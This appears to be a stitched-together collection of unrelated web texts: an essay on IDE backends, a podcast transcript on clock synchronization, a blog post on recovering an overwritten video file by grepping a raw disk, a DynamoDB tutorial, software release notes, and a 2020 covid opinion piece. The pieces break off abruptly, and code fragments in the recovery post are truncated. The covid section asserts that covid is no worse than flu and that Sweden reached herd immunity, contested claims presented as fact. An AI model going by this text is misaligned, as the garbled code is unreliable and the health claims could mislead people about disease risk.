Support for LSP in other editors is even more hit-and-miss.</p>
<p>LSP did achieve a significant breakthrough — it made people care about implementing IDE backends.
Experience shows that re-engineering an existing compiler to power an IDE is often impossible, or isomorphic to a rewrite.
How a compiler talks to an editor is the smaller problem.
The hard one is building a compiler that can do IDE stuff in the first place.
Check out <a href="https://rust-analyzer.github.io/blog/2020/07/20/three-architectures-for-responsive-ide.html">this post</a> for some of the technical details.
Starting with this use-case in mind saves a lot of effort down the road.</p>
<p>This I think is a big deal.
I hypothesize that the reason why IDEs do not completely dominate tooling landscape is the lack of good IDE backends.</p>
<p>If we look at the set of languages fairly popular recently, a significant fraction of them is dynamically typed: PHP, JavaScript, Python, Ruby.
The helpfulness of an IDE for dynamically typed languages is severely limited: while approximations and heuristics can get you a long way, you still need humans in the loop to verify IDE’s guesses.</p>
<p>There’s C++, but its templates are effectively dynamically typed, with exactly the same issues (and a very complex base language to boot).
Curiously, C looks like a language for which implementing a near-perfect IDE is pretty feasible.
I don’t know why it didn’t happen before CLion.</p>
<p>This leaves C# and Java.
Indeed, these languages are dominated by IDEs.
There’s a saying that you can’t write Java without an IDE.
I think it gets the causation direction backwards: Java is one of the few languages for which it is possible to implement a great IDE without great pain.
Supporting evidence here is Go.
According to <a href="https://blog.golang.org/survey2019-results#TOC_5.">survey results</a>, text editors are stably declining in popularity in favor of IDEs.</p>
<p>I think this is because Go actually has good IDEs.
This is possible because the language is sufficiently statically typed for an IDE to be a marked improvement.
Additionally, the language is very simple, so the amount of work you need to put in to make a decent IDE is much lower than for other languages.
If you have something like JavaScript…​
Well, you first need to build an alternative language for which you can actually implement an IDE (<a href="https://www.typescriptlang.org/">TypeScript</a>) and only then you can build the IDE itself (<a href="https://github.com/microsoft/vscode">VS Code</a>).</p>

<div><p>Welcome to Signals And Threads, in-depth conversations about every layer of the tech stack from Jane Street. I’m Ron Minsky.</p><p>Today we’re going to talk about a deceptively simple topic: clock synchronization. I think there’s nothing like trying to write computer programs to manipulate time to convince you that time is an incredibly complicated thing, and it’s complicated in like 16 different ways, from time zones to leap seconds to all sorts of other crazy things, but one of the really interesting corners of this world is how do you get all of the clocks on your big computer network to roughly agree with each other? In other words, clock synchronization.</p><p>So we’re going to talk about that with Chris Perl, who’s a sysadmin, who’s worked at Jane Street since 2012. Chris is better than anyone I have ever worked with, at diving into the horrible details of complex systems and understanding how they work and how they can be made to work better, and he’s done a lot of work here, specifically on clock synchronization, and has, in the course of that, redone our entire system for doing clock synchronization, so he’s had an opportunity to really learn a lot about the topic. Chris, to get started, can you give us just a quick overview of how computer clocks work in the first place?</p></div>

<h2 id="000115">00:01:15</h2>

<p>So, I guess the rough gist is something like you have some oscillator, a little crystal effectively that’s inside the computer that is oscillating at some frequency, and that’s driving an interrupt that the operating system is going to handle in some level – there’s probably lots of details here that I’m just skipping over – but that’s driving an interrupt that’s going happen in the operating system. And the operating system is using that to derive its notion of time, and so if you have a really high-quality oscillator, and those timer interrupts happen at the right rate so that you’re tracking real-time that might just happen, and if your oscillator’s very good, and very stable you could actually just be pretty close to the correct time just by virtue of that. But the truth is that most computers come with fairly bad oscillators and they change their frequencies for various reasons like heat, so if you are using your computer to compile the Linux kernel or something like that, that could change the heat profile, change the frequency of the oscillator, and actually change how well you’re doing of keeping real time.</p>

<h2 id="000205">00:02:05</h2>

<p>When we naively think of clock synchronization as people, we think of it as like, “I’m going to go set my clock”. I’m going to look at what time it is and adjust my clock to match whatever real-time is, but you’re actually talking about a different thing here. You’re talking not just about setting what the right time is right now but keeping that time correct, essentially keeping the rate at which time is going forward in sync.</p>

<h2 id="000224">00:02:24</h2>

<p>Correct. You’d love it if you could get like a really, really high-quality oscillator for super cheap in all your computers and then you wouldn’t need a lot of adjustment to get them to keep the correct time, but that would be really expensive. You can buy such things, they just cost a lot of money.</p>

<h2 id="000237">00:02:37</h2>

<p>So, you say that heat and various other things that are going on in the computer will cause this rate at which time is appearing to march forward inside of your computer to drift around. How accurate are these? Can give me a kind of numerical sense of how far these things drift away?</p>

<h2 id="000253">00:02:53</h2>

<p>The stuff that we run, we capture some of these statistics, we see machines that have a frequency correction applied to them of, say, 50 parts per million, which is like microseconds per second, so that works out to roughly a couple seconds per day, is how you would wind up drifting off. But I’m sure that if you had a super old desktop under your desk, that you stole from your parents or something and you were trying to rebuild into a Linux box, you might have worse numbers than that. Like a sort of relatively current generation server from a well-known vendor, you’re talking somewhere around 50 to 100 microseconds per second that they can sort of walk-off out of alignment.</p>

<h2 id="000327">00:03:27</h2>

<p>Okay, so clock synchronization is the process of trying to get all of those clocks that you have across your whole data center and across multiple data centers to be in sync with each other. Is that the right way of thinking about it?</p>

<h2 id="000339">00:03:39</h2>

<p>I think so. “In sync”, is an interesting sort of thing to say, right? You kind of would like that if you were able to instantaneously ask two random servers on your network, what time it was at the same exact point in time, if you could somehow magically do that, that they would agree to some relatively small margin of error, and I think that that’s kind of what we mean by clock synchronization. That if you could somehow magically freeze time and go ask every single computer on your network, “Hey. What time do you think it is?” that they would all roughly agree to within some error bound that you can define.</p>

<h2 id="000413">00:04:13</h2>

<p>Right. And this basic model actually assumes that there is a well-defined notion of what it means to be instantaneously at the same time, which isn’t exactly true because of relativity and stuff like that, but we’re going to mostly ignore that. So, I guess one property that you’re highlighting here is having the clocks agree with each other, and that’s part of it, but there’s another piece, right, which is having the clocks agree with some external reference. There’s some notion of like, what does the world think the time is? So, where does that external reference come from?</p>

<h2 id="000435">00:04:35</h2>

<div><p>I’m not an expert on this stuff, but I’ll give you the sort of 10,000-foot view. You have various physics laboratories all over the world, like NPL in the UK, and other places across the world. They all have measurements of what they think time is, using things like hydrogen masers and sort of very accurate atomic methods. They contribute all of that stuff to a single source who kind of averages it, or does some sort of weighting, to come up with what the correct time is, and then you kind of magic that over to the Air Force, who then sends it up to the GPS constellation. And GPS has a mechanism for getting time from the GPS satellites down to GPS receivers, and so if you’re a person who runs a computer network and you’re interested in synchronizing your clocks to a relatively high degree of accuracy with something like UTC, which is effectively Greenwich Mean Time, it is just sort of the current time without time zones applied. </p><p>If you’re interested in doing that, what you can do is you can just go out to a vendor and you can buy a thing called a GPS appliance, which can hook up to a little antenna that goes onto the roof. It can receive this signal from the GPS constellation and basically gives you out time, and the accuracy there is something like maybe 100 nanoseconds or so. So you’ve got the sort of atomic measurements being fed up to a GPS constellation, down to GPS receivers that you, as an operator of a computer network, can buy.</p></div>

<h2 id="000557">00:05:57</h2>

<p>And for the purposes of this conversation, we’re going to treat those GPS receivers as the received wisdom as to what time it is, and our job is to figure out how, inside of a computer network, you make all of the different devices agree with each other and agree with that external reference.</p>

<h2 id="000611">00:06:11</h2>

<p>Correct.</p>

<h2 id="000612">00:06:12</h2>

<p>Why is it important? What does having synchronized clocks help you do?</p>

<h2 id="000622">00:06:22</h2>

<p>If you put yourself in the shoes of a financial regulatory authority, and you have all these different participants out there doing stuff with computer systems, and something weird happens, and you’d like to come up with a total ordering of events of what led to this crazy thing – or what led to this good thing, who knows – but you want to have a total ordering of events. If people don’t have good clock synchronization, to some external source, you can’t compare the timestamp from participant A to the timestamp from participant B, so if you were to decree everybody must have time that is within some error bound, you know if these timestamps are within that error bound, well, then I can’t be sure about the ordering, but if they’re farther away than that then I can be sure about the ordering. I can know which one came first and which one came second, and that can be very useful.</p>

<h2 id="000655">00:06:55</h2>

<p>So that’s the motivation that’s very specific to our industry, but don’t people in other industries care a lot about clock synchronization, too? I would have thought that there are other reasons that would drive you to want to synchronize the machines on the network.</p>

<h2 id="000706">00:07:06</h2>

<p>Oh, sure. There’s lots of different things. I mean, just like a general sysadmin topic, a lot of times you want to gather logs from all the systems on your computer network, and you want to analyze them for various reasons. Maybe it’s because you’re concerned about intruders. Or maybe it’s because you’re just trying to understand the way things are functioning, and if your clocks aren’t synchronized it’s very hard to kind of understand things that might have happened on system B and how they relate to system A because the two timestamps are just not – you just can’t compare them if they’re not synchronized.</p>

<h2 id="000733">00:07:33</h2>

<p>And I suppose there are also some distributed systems, algorithmic reasons to want clocks. Certainly, some kinds of distributed algorithms end up using clocks as ways of breaking ties between systems, and so that requires at least some reasonable level of synchronization.</p>

<h2 id="000745">00:07:45</h2>

<p>For sure. There’s also other network protocols that are widely used that require clock synchronization, but much less precise levels of clock synchronization. Kerberos is a widely used authentication protocol, and that requires that the clocks be synchronized to within five minutes, and the idea there is to thwart replay attacks, and stuff like that, making …</p></div></div>

        <section>
            <p>It’s been a while since we shared the story of an incident with you, and that’s probably a good thing –
most operational incidents we had in the past year were “boring” enough in nature to fix them easily.
This time, we’ve got a story of a data loss, caused by pure and simple human error – and the story of
how we recovered the data.</p>

<p>Even though it is quite embarrassing how the data loss happened, we think it’s worth sharing the story
of its recovery, as it might allow you to learn a few useful things in case you ever end up in a
similar situation.</p>

<p>As you might have seen, over the last 7 months we’ve extended our offerings beyond ticketing to allow
our customers to transform their events into the digital space as long as the global pandemic makes
traditional event formats impossible. The result of our effort is a joint venture called 
<a href="https://venueless.org/">Venueless</a> that you should absolutely check out if you haven’t yet.</p>

<p>One component of the virtual events we run on venueless is <strong>live video streaming</strong>. In this process,
our customers use a tool like <a href="https://obsproject.com/">OBS</a> or <a href="https://streamyard.com/">StreamYard</a>
to create a live video stream. The stream is then sent to an <strong>encoding server</strong> of ours via RTMP.
On the encoding server, we re-encode the stream into different quality levels and then distribute
it to our very own tiny streaming CDN.</p>

<p>Venueless currently does <strong>not yet</strong> include a video-on-demand component and usually, our customers record
their content at the source, e.g. with OBS or StreamYard, and process or publish them on their own.
However, just to be safe, we keep a recording of the incoming stream as well. This isn’t currently
part of our promoted service offering, we rather see it as a free backup service to our clients in case they
lose their recording. Given that we already consider it to just be a backup, we currently don’t make any
further backups of this data.</p>

<h4 id="data-loss">Data loss</h4>

<p>Usually, we delete these recordings after a while, but in some cases, our customers ask us to get them, e.g.
because their own recording failed, or because StreamYard only records the first 8 hours of every
stream. Since this doesn’t happen a lot, it’s not yet an automated process in our system. Whenever a customer
requests a recording we SSH into the respective encoding server and move the recording file to a
directory that’s accessible through HTTP, like this:</p>

<pre><code>/var/recordings $ mv recording-12345.flv public/
</code></pre>

<p>That’s it, we share the link with the customer, and the process is done. One of the simplest steps possible
in all this. Yesterday, a customer asked us for the recordings of the two last streams of their event. Just
before finishing up for the week, I wanted to supply them with the required file, SSH’d into the server,
looked for the correct files and typed…</p>

<pre><code>/var/recordings $ mv recording-16678.flv recording-16679.flv
</code></pre>

<p><strong>Oops.</strong> I hit return before typing out <code>public/</code>, and therefore replaced the last stream with the
second-last, losing one of the videos.</p>

<h4 id="damage-control">Damage control</h4>

<p>Having a very naive understanding of how file systems work, I knew that the <code>mv</code> command has only
changed the directory listing of the file system, but hasn’t actually wiped the file from the disk,
so I knew there is likely still a chance to recover the file, if it’s not overwritten by something
else in the meantime.</p>

<p>Since I didn’t manage to re-mount the root partition as read-only to avoid further damage softly,
I used the <a href="https://www.kernel.org/doc/html/latest/admin-guide/sysrq.html">big hammer</a> to remount
everything read-only immediately:</p>

<pre><code># echo u &gt; /proc/sysrq-trigger
</code></pre>

<p>Uhm, okay, this worked, but how do I install any data recovery tools now? After some experiments,
I decided it would be easiest to reboot into the recovery system provided by our server provider
<a href="https://www.hetzner.com/">Hetzner</a>. So I configured the boot loader to boot their recovery system
from the network and forcefully rebooted the server.</p>

<p>To be able to perform disk dumps and have some operational flexibility without downloading a 2 TB
disk image to my local machine (which would take rougly a week), I also quickly purchased
a <a href="https://www.hetzner.com/storage/storage-box">Hetzner Storage Box</a> with 5 TB space.</p>

<h4 id="failed-attempts">Failed attempts</h4>

<p>Just before I executed my fatal <code>mv</code> command, I executed <code>ls -lisah</code> to get a directory listing
of the files:</p>

<pre><code>3146449 1.1G -rw-r--r-- 1 www-data www-data 1.1G Nov XX XX:XX recording-16678.flv
3146113 1.6G -rw-r--r-- 1 www-data www-data 1.6G Nov XX XX:XX recording-16679.flv
</code></pre>

<p>This meant I <strong>knew</strong> the inode number of the deleted file! As I mentioned before, my understanding
of file systems was (and is) rather naive, and I was pretty optimistic to be able to recover the
file using that information. Isn’t that sort of what a journaling file system is for?</p>

<p>Recovering the file this way hover appeared to be impossible. <a href="http://ext4magic.sourceforge.net/howto_en.html">ext4magic</a>
and <a href="http://extundelete.sourceforge.net/">extundelete</a> are powerful tools that did find some 
deleted files on my disk – but not the one I was looking for, even after trying different options
for over two hours.</p>

<p>I did not spend the time to really understand how ext4 works, but from what I gathered from various
blogs, I was pretty much out of luck since the inode did no longer contain the relevant information
and ext4magic also wasn’t able to <a href="http://ext4magic.sourceforge.net/howto_en.html#Recovery_process_5">recover the neccessary information from the journal</a>
either.</p>

</code></pre>

<p>However, if you’re in a similar situation – the ext4magic how-tos are really helpful and worth a try.</p>

<h4 id="successful-recovery">Successful recovery</h4>

<p>There is this one other approach to file recovery that is often recommended on the internet, usually
for “small text files”: Just <code>grep</code> your whole disk for known parts of its contents! So why wouldn’t
this work on larger non-text files as well?</p>

<p>The first problem is obviously what to grep for. The only thing I know about the missing file, apart
from its rough size, is that it’s a FLV video file. Luckily, <a href="https://en.wikipedia.org/wiki/Flash_Video#Flash_Video_Structure">all FLV files</a>
that contain video start with the byte sequence <code>FLV\x01\x05</code>. So let’s search our 2 TB disk for
that byte sequence and print out the byte offset of all occurences!</p>

<pre><code>cat /dev/md2 \
	| pv -s 1888127576000 \
	| grep -P --byte-offset --text 'FLV\x01\x05' \
	| tee -a /mnt/storagebox/grep-log.txt
</code></pre>

<p>This took roughly 7 hours. The <code>pv</code> command with the (rough) total size of the disk is optional, but gives you
a nice progress bar. Overall, this took a little over 6 hours on our server.</p>

<p><code>grep</code> works line-based, which in a binary file menas “any byte sequence between two ASCII line breaks”. The
log file therefore contained lots of lines like this:</p>

<pre><code>184473878409:&lt;some binary data&gt;FLV&lt;some binary data&gt;
</code></pre>

<p>In total, the search found 126 FLV file headers on our disk. This was pretty reassuring, since we had 122 FLV files
still known to the file system – so there are at least four FLV byte sequences without a filename!</p>

<pre><code># find /mnt/disk/var/recordings/ -name '*.flv' -not -empty -ls | wc -l
122
</code></pre>

<p>Now, I needed to find out which of the 126 byte sequences did not have a filename. Since I really didn’t want
to spend all weekend with a deep-dive into the ext4 disk layout, I went for an easier solution: For every file
still known in the file system, I computed a hash of the first 500 kilobytes of the file:</p>

<figure><pre><code data-lang="python"><span>#!/usr/bin/python3

    <span>len</span><span>(</span><span>known_hashes</span><span>),</span> <span>"hashes"</span>
<span>)</span></code></pre></figure>

<p>Interestingly, two files from the completely different customers shared the same hash of the first 500 kilobytes.
I haven’t tested it yet, but my theory is that those were streams that just did not contain any audio or video
in their first minutes, but only empty frames. However, since I knew this isn’t the case for my missing file,
I felt confident in proceeding with this approach.</p>

<p>Next, I computed the same hash for every byte offest found by grep and compared it to the hashes found in the
previous step:</p>

<figure><pre><code data-lang="python"><span>grep_log</span> <span>=</span> <span>'/mnt/storagebox/grep-log.txt'</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>DynamoDB is a NoSQL database that delivers single-digit millisecond performance at scale. </p>
<blockquote>
<p>"DynamoDB can manage upward of 10 trillion requests daily and can support thresholds of more than 20 million requests per second" - AWS</p>
</blockquote>
<p>Having been using it for while, in this article, I'm going to summarize essential knowledge about Amazon DynamoDB that helps you: <em>Quickly understand and know its use cases</em> -&gt; <em>Get started using it</em> -&gt; <em>Know what to consider for best utilization</em>.</p>
<p>It's a 15-minute read, but after reading it, you'll know how DynamoDB works, when you should use it, and how to best utilize it when it's necessary.</p>
<hr>

<p>First of all, it's Amazon DynamoDB, not AWS DynamoDB. <em>(People understand it either way, it's respectful to call a thing correctly though)</em></p>
<h2 id="what-is-dynamodb">What is DynamoDB?</h2>
<p>Basically, DynamoDB is a database where you write and read your application data. Application data is the core information of your application like user profiles, user activities, transactions, etc. These data change very frequently and grow enormously large as your application grows. Using a database like DynamoDB, you don't need to work with physical disks, you simply ask the database to write and read data for you, it will make sure things work correctly under the hood.</p>
<p>Technically, DynamoDB is a <strong>fully-managed</strong>, <strong>NoSQL</strong>, <strong>key-value</strong> and <strong>document-based</strong> database.</p>
<ul>
<li><p><strong>Fully-managed</strong>: AWS <em>fully manages</em> it for you. DynamoDB scales seamlessly, you don't maintain any server. AWS takes full responsibility for running, managing servers, software updates, backing up, cluster scaling, and all other ops. You use it by calling its APIs, just like how you'd use Stripe.</p>
</li>
<li><p><strong>NoSQL</strong>, <strong>key-value</strong>: DynamoDB has neither relationship nor schema, which means that you don't have to define what columns or fields an entry of data has. DynamoDB consists of <em>tables</em>. Each table consists of <em>items</em>. Each item has <em>a uniquely identifiable key</em> and <em>other non-constraint attributes</em>. Each attribute is a <em>pair of key and value</em>. A key is a string. A value can be null, string, number, boolean, binary, list, or nested object. Except for the unique key, items can have different attributes from each other.</p>
<pre><code>

<span>"Table X"</span>: [
  {
     <span>"key"</span>: <span>"unique-key-1"</span>,
     <span>"a"</span>: <span>"some-value"</span>,
     <span>"b"</span>: <span>1</span>
  },
  {
     <span>"key"</span>: <span>"unique-key-2"</span>,
     <span>"c"</span>: <span>false</span>,
     <span>"d"</span>: {
        <span>"it"</span>: <span>"can have nested JSON"</span>,
        <span>"too"</span>: <span>null</span>
     }
  },

  
]

<span>"Table Y"</span>: [  
  
]
</code></pre>
<ul>
<li><strong>Document-based</strong>: Each entry of data in DynamoDB is a JSON document, a.k.a. JSON object. Every operation happens at the document level, which means that an operation is either a document is retrieved, or a document is created, or a document is replaced, or a document is deleted. There's no operation at attribute level.</li>
</ul>
</li>
</ul>
<h2 id="pricing-model">Pricing model</h2>
<p>DynamoDB offers 2 pricing models:</p>
<ul>
<li><p><strong>Pay per request</strong>: you pay for the number of writes and reads you requested. DynamoDB automatically scales to accommodate traffic from your application. It costs <em>$1.25 per million write</em> request units and <em>$0.25 per million read</em> request units (in Ohio region). This model is a good choice if you can't predict how much traffic your application will receive and don't prioritize cost optimization yet.</p>
</li>
<li><p><strong>Provisioned</strong>: you specify and pay for a specified number of read units and write units <em>per hour</em>. DynamoDB will be always ready to handle traffic at the provisioned capacity, regardless of how much traffic your application is actually receiving. This helps you set a predictable cost and performance for your application. It's useful when you've already known the pattern. You can change provisioned units every 24 hours.</p>
</li>
</ul>
<p>Additionally, when your application is growing steadily, you can buy <em>reserved units</em>, which can save over half the price if you pay upfront for a year.</p>
<h2 id="use-cases">Use cases</h2>
<blockquote>
<p>DynamoDB works best when you're searching for simplicity and scalability.</p>
</blockquote>
<p>Because of its serverless trait, DynamoDB helps you have (theoretically) infinitely scalable database infrastructure from day one with zero ops overhead in the future. When your application data grow to terabytes or petabytes, your database infrastructure stays the same, you simply provision and buy more capacity. This can be an advantage to keep your technical team lean.</p>
<p>However, DynamoDB query ability is quite limited compared to most other database services, which makes it difficult and inefficient to query complex models and relationships.</p>
<p>In my experience, DynamoDB is a great choice for microservices, where each service has 2-4 models, and their relationships can be detached and implemented in a NoSQL design.</p>
<p>Netflix uses DynamoDB to build its A/B testing service that serves 125+ million users, while FanFight reported saving 50% of cost and achieving 4x revenue by migrating to DynamoDB.</p>
<hr>

<p>Now, let's explore some essential concepts to get started using it.</p>
<h2 id="partitions">Partitions</h2>
<p>DynamoDB slices your table up into smaller chunks of data called <em>partitions</em>, in order to speed up reads.</p>
<p>Each table must have a partition key, which DynamoDB uses to decide which partition to put an item into.</p>
<p>A partition is also logical isolation of a DynamoDB query. A DynamoDB query can only query data in a partition. If you need to query data in 2 different partitions, you'll need 2 queries or a full table scan.</p>
<h2 id="primary-key">Primary key</h2>
<p>A primary key is a way to uniquely identify an item in a table, it is the only attribute that you'll need to define before creating a DynamoDB table and starting to use it.</p>
<p>There're 2 types of a primary key in DynamoDB:</p>
<ul>
<li><p><strong>Single primary key</strong>: the partition key - a single and always-unique attribute, which is usually an ID, e.g. user ID, post ID, etc.</p>
</li>
<li><p><strong>Composite primary key</strong>: the partition key and a sort key. The first key is used for partitioning, the second key is used to sort items in the same partition. The combined value of these two keys has to be unique across a table.</p>
</li>
</ul>
<h2 id="5-types-of-read">5 types of read</h2>
<p>In DynamoDB, there are 5 types of a read operation:</p>
<ul>
<li><p><code>GetItem</code>: read a single item by specifying its primary key.</p>
</li>
<li><p><code>BatchGetItems</code>: send a request that groups up to 100 <code>GetItem</code> requests together. Each request is executed separately and in parallel. It is possible that some reads succeed whereas others fail.</p>
</li>
<li><p><code>TransactGetItems</code>: all-or-nothing <code>BatchGetItems</code>. All operations must either succeed or fail together. This costs twice as much as <code>BatchGetItems</code>.</p>
</li>
<li><p><code>Query</code>: read multiple items in the same partition. You must specify the partition key, and optionally a filter condition on the sort key.</p>
</li>
<li><p><code>Scan</code>: read <strong>all items</strong> in a table.</p>
</li>
</ul>
<h2 id="read-consistency">Read consistency</h2>
<p>DynamoDB has 2 types of read consistency, which can be useful for different applications:</p>
<ul>
<li><p><strong>Eventually read consistency</strong>: you get your data the fastest, but not always the latest. You'll usually receive the data 1 second ago.</p>
</li>
<li><p><strong>Strongly read consistency</strong>: you always get the latest data, but the latency may be higher and the reading cost is double.</p>
</li>
</ul>
<h2 id="secondary-indexes">Secondary indexes</h2>
<p>Every read operation except for a <code>Scan</code> must start with the partition key, to query on other attributes without scanning through the whole table, you'll need another tool - a secondary index.</p>
<p>A secondary index is essentially an (automatic) copy of a table but has a different partition key and sort key so that you can query on these different keys.</p>
<p>There're two types of a secondary index in DynamoDB:</p>
<ul>
<li><p><strong>Global secondary index</strong>: is a complete copy of a table, has its own partition key and (optionally) a sort key. A partition key in a global secondary index doesn't have to be unique. Global secondary index only supports eventually consistent read.</p>
</li>
<li><p><strong>Local secondary index</strong>: is a local copy of a partition sorted by another key. A local secondary index shares the same partition key as the base table but has a different sort key. Local secondary index supports both strongly and eventually consistent read.</p>
</li>
</ul>
<p>After creating an index, you do all read operations on it as if you do on the base table.</p>
<p>Creating a secondary index will cost you more for data storage and write operations. DynamoDB automatically updates the indexes when you update the base table and it will charge for all these updates as typical write operations.</p>
<h2 id="3-types-of-write">3 types of write</h2>
<p>In DynamoDB, there are 3 types of a write operation:</p>
<ul>
<li><p><code>PutItem</code>, <code>UpdateItem</code>, and <code>DeleteItem</code>: create, update and delete a single item by specifying its primary key.</p>
</li>
<li><p><code>BatchWriteItems</code>: send a request that groups up to 25 <code>PutItem</code> and <code>DeleteItem</code> requests together. Each request is executed separately and in parallel. It is possible that some writes succeed whereas others fail.</p>
</li>
<li><p><code>TransactWriteItems</code>: all-or-nothing <code>BatchWriteItems</code>. All operations must either succeed or fail together. This costs twice as much as <code>BatchWriteItems</code>.</p>
</li>
</ul>
<hr>


<p>Related models mean that these models have a direct relationship to each other. For example, a post belongs to a user, a post has multiple comments, a user can comment on multiple posts.</p>
<p>When your app has more than 3 related models, it's highly a chance that SQL is a better choice because you have out-of-the-box extremely complex query features in SQL. Modeling relationships in SQL is much simpler. On the contrary, trying to model relationships in NoSQL is like trying to workaround its disadvantages.</p>
<h3 id="can-i-break-my-app-into-smaller-apps">Can I break my app into smaller apps?</h3>
<p>DynamoDB is best for microservices when your app is a combination of multiple smaller apps.</p>
<p>Let's take the posts-comments-users example, can you break it into smaller apps? The answer is yes, you can make it 3 smaller apps:</p>
<ul>
<li><p><em>User directory app</em>: stores user profiles, credentials, etc, and authenticates users.</p>
</li>
<li><p><em>Blogging app</em>: stores and renders posts.</p>
</li>
<li><p><em>Commenting app</em>: stores and shows comments.</p>
</li>
</ul>
<p>DynamoDB is the perfect database for these smaller apps because they have very simple and discrete data.</p>
<p><strong>Pro-tip #1</strong>: There's a high possibility that there're external services implemented for one of your smaller apps, e.g. Firebase for authentication, Disqus for commenting.</p>
<p><strong>Pro-tip #2</strong>: Because of this, DynamoDB is a great choice if you want to build micro-SaaS, which is on-trend in the current market 🤯.</p>
<h3 id="1-write-40-reads">1 write = 40 reads</h3>
<p>Use this to decide whether you should …</p></div></div>

<p>This release integrates all the <a href="https://summerofcode.withgoogle.com/">GSoC</a>
work from Pawel (<a href="https://github.com/enneract">@enneract</a>), most of the code
from Nishant (<a href="https://github.com/njwardhan">@njwardhan</a>) and, the
optimizations from Omar (<a href="https://github.com/OmarWagih1">@OmarWagih1</a>).
We would like to thank them again for their great contributions!</p>
<p><img alt="/images/Blog_Colour_Rendition_Report.png" src="https://www.colour-science.org/images/Blog_Colour_Rendition_Report.png"></p><p>With this release, we stop testing for
<a href="https://www.python.org/downloads/release/python-350/">Python 3.5</a> and,
<a href="https://docs.scipy.org/doc/scipy/reference/release.1.1.0.html">Scipy&gt;=1.1.0</a>
becomes the minimum version. This is also the <strong>last feature release to
support</strong> <a href="https://www.python.org/downloads/release/python-270/">Python 2.7</a>.
We will also trim the deprecation code in the next version thus, please make
sure to update your code accordingly.</p>
<p>Besides the various minor changes and fixes, the highlights of this release are:</p>
<ul>
<li><p>Support for <em>Jakob and Hanika (2019)</em>, <em>Mallett and Yuksel (2019)</em> and,
<em>Otsu, Yamamoto and Hachisuka (2018)</em> spectral upsampling methods thanks to
Pawel's contributions as part of GSoC 2020.</p></li>
<li><p>Support for the computation of the <em>CIE 2017 Colour Fidelity Index</em> and
<em>ANSI/IES TM-30-18 Colour Fidelity Index</em> colour quality metrics thanks to
Pawel's contributions as part of GSoC 2020.</p></li>
<li><p>Support for generation of the <em>ANSI/IES TM-30-18 Colour Rendition Report</em>
thanks to Pawel's contributions as part of GSoC 2020.</p></li>
<li><p>Improvements of the LUT IO support thanks to Nishant's contributions as
part of GSoC 2020.</p></li>
<li><p>Performance improvements thanks to Omar's contributions as part of GSoC
2020.</p></li>
<li><p>Support for <em>ACES Input Device Transform (IDT)</em> generation: The
implementation follows to some extent
<a href="https://github.com/ampas/rawtoaces">RAW to ACES v1</a> and
<a href="https://www.dropbox.com/s/ouwnid1aevqti5d/P-2013-001.pdf?dl=0">P-2013-001</a>
procedure.</p></li>
<li>
<p>New <em>ISO</em> spectral datasets:</p>
<ul>
<li><p>ISO 6728 Standard Lens</p></li>
<li><p>ISO 7589 Diffuser</p></li>
<li><p>ISO 7589 Photographic Daylight</p></li>

instantiation time interpolation parameters instead of blindly applying
<em>CIE 167:2005</em> recommendation, this introduces minor numerical changes.</p></li>
<li><p>Many definitions, methods and module attributes have been renamed to
improve consistency and we are reaching a satisfactory point in that
regard, hopefully, the names will be much more stable from now on.</p></li>

Ever. And I don’t mean the least deadly September, I mean the least deadly month. Ever. To me, this is pretty clear evidence of two things. First, that covid is not a very deadly disease. And second, that Sweden has herd immunity.</p><p><a href="https://twitter.com/sebrushworth/status/1319222055343185921" target="_blank" rel="noreferrer noopener">When I posted this information on my twitter feed</a>, the response from proponents of further lockdown was that the reason September was such an un-deadly month, was because everyone has already died earlier in the pandemic. To me, that seems like a pretty self-defeating argument. Why?</p><p>Because 6,000 people have died of covid in Sweden, a country with a population of 10,000,000 people. 6,000 people is 0,06% of the population. If it is enough for that tiny a fraction of a population to die of a pandemic for the pandemic to peter out so completely that a country can have its least deadly month ever, then the pandemic was never that deadly to begin with.</p><p>In August, <a href="https://sebastianrushworth.com/2020/08/04/how-bad-is-covid-really-a-swedish-doctors-perspective/" target="_blank" rel="noreferrer noopener">I wrote an article where I proposed that the mortality for covid is only 0,12%</a>, roughly the same as influenza. That number was based on a back-of-the-envelope calculation. I figured that, since the death rate had dropped continuously for months and was at very low levels, Sweden must have reached a point where it had herd immunity. And I figured that at least 50% of the population must have been infected for herd immunity to have been reached. 50% of Sweden’s population is five million people. 6,000 / 5,000,000 = 0,12%</p><p>At the beginning of October, one of the World Health Organisation’s executive directors, Mike Ryan, <a href="https://www.irishtimes.com/news/ireland/irish-news/covid-19-world-in-for-a-hell-of-a-ride-in-coming-months-dr-mike-ryan-says-1.4370626" target="_blank" rel="noreferrer noopener">said that the WHO estimated that 750 million people had so far been infected with covid</a>. At that point, one million people had died of the disease. That gives a death rate for covid of 0,13% . So the WHO said that the death rate is 0,13% . Not too far off my earlier back-of-envelope estimation. This of course begs the question why there are continued lockdowns for a disease that is no worse than the flu.</p><p>A short while later, the <a href="https://www.who.int/bulletin/online_first/BLT.20.265892.pdf" target="_blank" rel="noreferrer noopener">WHO released an analysis by professor John Ioannidis</a>, with his estimate of the covid death rate. This analysis was based on seroprevalance data, i.e. data on how many people were shown to have antibodies to covid in their bloodstream at different times in different countries, which was correlated with the number of deaths in those countries. Through this analysis, professor Ioannidis reached the conclusion that covid has an overall mortality rate of around 0,23% (in other words, one in 434 infected people die of the disease). For people under the age of seventy, the mortality rate was estimated at 0,05% (in other words, one in 2,000 infected people under the age of 70 die of the disease).</p><p><a href="https://sebastianrushworth.com/2020/09/28/herd-immunity-without-antibodies/" target="_blank" rel="noreferrer noopener">As I’ve discussed before, I don’t think antibody data gives a very complete picture</a>, since there are studies showing that a lot of people don’t produce measurable antibodies in their bloodstreams, but still have immunity, either thanks to a T-cell response, or thanks to local antibody production in the respiratory tract. So I think that the fatality rate is significantly lower than what the analysis by professory Ioannidis found, and more in line with what the WHO stated earlier in October.</p><p>But even if the antibody based number is the correct number, then covid still is not a very deadly disease. For comparison, the 1918 flu pandemic is thought to have had an infection fatality rate of 2,5%, i.e. one in forty infected people died. So the 1918 flu was 11 times more deadly than covid if you go by professor Ioannidis antibody based numbers, and 19 times more deadly than covid if you go by the fatality rate provided 12 days earlier by the WHO’s Mike Ryan.</p><p>And this is missing one big point about covid. The average person who dies from covid is over 80 years old and has multiple underlying health conditions. In other words, their life expectancy is very short. The average person who died in the 1918 pandemic was in their late 20’s. So each death in the 1918 pandemic actually meant around 50 years more of life lost per person than each death in the covid pandemic. Multiply that by the fact that it had a 19 times higher death rate, and the 1918 flu was in fact 950 times more deadly than covid, in terms its capacity to shorten people’s lives.</p><p>Ok, I’ve discussed the fatality rate of the 